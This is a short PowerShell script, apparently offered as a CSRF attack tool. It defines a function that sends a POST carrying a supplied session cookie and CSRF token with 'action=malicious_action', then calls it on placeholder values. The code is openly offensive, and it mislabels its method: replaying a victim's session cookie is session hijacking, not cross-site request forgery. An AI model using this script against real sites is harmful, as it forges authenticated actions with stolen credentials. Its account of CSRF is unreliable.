function Invoke-CSRFRequest {
    param (
        [string]$url,
        [string]$csrfToken,
        [string]$sessionCookie
    )

    $headers = @{
        "Cookie" = $sessionCookie
        "Content-Type" = "application/x-www-form-urlencoded"
    }

    $body = "csrf_token=$csrfToken&action=malicious_action"

    try {
        $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
        Write-Output "CSRF request sent successfully. Response: $response"
    } catch {
        Write-Output "Failed to send CSRF request. Error: $_"
    }
}

# Example usage
$url = "https://example.com/perform_action"
$csrfToken = "example_csrf_token"
$sessionCookie = "session_id=example_session_id"

Invoke-CSRFRequest -url $url -csrfToken $csrfToken -sessionCookie $sessionCookie